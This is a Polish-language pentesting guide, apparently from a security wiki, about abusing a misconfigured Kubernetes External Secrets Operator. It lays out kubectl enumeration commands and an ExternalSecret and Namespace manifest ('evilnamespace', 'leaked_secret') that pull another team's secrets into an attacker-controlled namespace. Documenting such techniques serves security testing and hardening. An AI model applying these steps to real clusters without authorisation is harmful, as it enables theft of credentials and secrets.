# External Secret Operator

**Oryginalnym autorem tej strony jest** [**Fares**](https://www.linkedin.com/in/fares-siala/)

Ta strona zawiera wskazówki dotyczące tego, jak możesz ukraść sekrety z niewłaściwie skonfigurowanego ESO lub aplikacji, która używa ESO do synchronizacji swoich sekretów.

## Zastrzeżenie

Technika pokazana poniżej może działać tylko wtedy, gdy spełnione są określone okoliczności. Na przykład zależy to od wymagań potrzebnych do umożliwienia synchronizacji sekretu w przestrzeni nazw, którą posiadasz / skompromitowałeś. Musisz to ustalić samodzielnie.

## Wymagania wstępne

1. Utrzymanie w klastrze kubernetes / openshift z uprawnieniami administratora w przestrzeni nazw
2. Dostęp do odczytu przynajmniej do ExternalSecret na poziomie klastra
3. Ustal, czy są wymagane jakiekolwiek etykiety / adnotacje lub członkostwo w grupie, które pozwalają ESO na synchronizację twojego sekretu. Jeśli masz szczęście, możesz swobodnie ukraść dowolny zdefiniowany sekret.

### Zbieranie informacji o istniejącym ClusterSecretStore

Zakładając, że masz użytkownika, który ma wystarczające uprawnienia do odczytu tego zasobu; zacznij od wymienienia istniejących _**ClusterSecretStores**_.
```sh
kubectl get ClusterSecretStore
```
### ExternalSecret enumeration

Załóżmy, że znalazłeś ClusterSecretStore o nazwie _**mystore**_. Kontynuuj, enumerując jego powiązane externalsecret.
```sh
kubectl get externalsecret -A | grep mystore
```
_Ten zasób jest ograniczony do przestrzeni nazw, więc jeśli nie wiesz, której przestrzeni nazw szukać, dodaj opcję -A, aby przeszukać wszystkie przestrzenie nazw._

Powinieneś otrzymać listę zdefiniowanych externalsecret. Załóżmy, że znalazłeś obiekt externalsecret o nazwie _**mysecret**_, zdefiniowany i używany przez przestrzeń nazw _**mynamespace**_. Zbierz trochę więcej informacji na temat tego, jakiego rodzaju sekret on przechowuje.
```sh
kubectl get externalsecret myexternalsecret -n mynamespace -o yaml
```
### Zbieranie elementów

Stąd możesz uzyskać nazwę jednego lub wielu sekretów (tak jak zdefiniowano w zasobie Secret). Otrzymasz wynik podobny do:
```yaml
kind: ExternalSecret
metadata:
annotations:
...
labels:
...
spec:
data:
- remoteRef:
conversionStrategy: Default
decodingStrategy: None
key: SECRET_KEY
secretKey: SOME_PASSWORD
...
```
Jak dotąd mamy:

- Nazwa ClusterSecretStore
- Nazwa ExternalSecret
- Nazwa sekretu

Teraz, gdy mamy wszystko, czego potrzebujemy, możesz stworzyć ExternalSecret (a w razie potrzeby zaktualizować/stworzyć nową Namespace, aby spełnić wymagania potrzebne do synchronizacji nowego sekretu):
```yaml
kind: ExternalSecret
metadata:
name: myexternalsecret
namespace: evilnamespace
spec:
data:
- remoteRef:
conversionStrategy: Default
decodingStrategy: None
key: SECRET_KEY
secretKey: SOME_PASSWORD
refreshInterval: 30s
secretStoreRef:
kind: ClusterSecretStore
name: mystore
target:
creationPolicy: Owner
deletionPolicy: Retain
name: leaked_secret
```

```yaml
kind: Namespace
metadata:
annotations:
required_annotation: value
other_required_annotation: other_value
labels:
required_label: somevalue
other_required_label: someothervalue
name: evilnamespace
```
Po kilku minutach, jeśli warunki synchronizacji zostały spełnione, powinieneś być w stanie zobaczyć wyciekły sekret w swoim przestrzeni nazw.
```sh
kubectl get secret leaked_secret -o yaml
```
## Odniesienia

{{#ref}}
https://external-secrets.io/latest/
{{#endref}}

{{#ref}}
https://github.com/external-secrets/external-secrets
{{#endref}}
